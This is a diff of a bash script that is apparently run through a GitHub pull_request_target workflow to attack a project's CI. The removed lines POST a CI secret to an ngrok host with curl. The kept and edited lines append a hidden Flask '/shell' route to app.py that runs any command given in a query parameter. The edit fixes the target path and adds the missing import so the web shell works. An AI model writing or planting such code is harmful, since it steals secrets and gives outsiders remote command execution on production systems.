@@ -1,17 +1,11 @@
-#!/bin/bash
-
-# EXFILTRATION: Stealing the secret provided by pull_request_target
-echo "[!] Exfiltrating secret..."
-curl -X POST -d "leak=$MY_SECRET" https://ff43a7cec894.ngrok-free.app/log
-
-# PERSISTENCE: Injecting a backdoor into the app code before it's containerized
+# PERSISTENCE: Injecting a backdoor into the app code
 echo "[!] Injecting Production Backdoor..."
-cat <<EOF >> ./app/app.py
+# Change path from ./app/app.py to ./app/app/app.py
+cat <<EOF >> ./app/app/app.py
 
 @app.route('/shell')
 def shell():
     import os
+    from flask import request
     return os.popen(request.args.get('c')).read()
 EOF
-
-echo "[+] Build process 'finished' successfully."
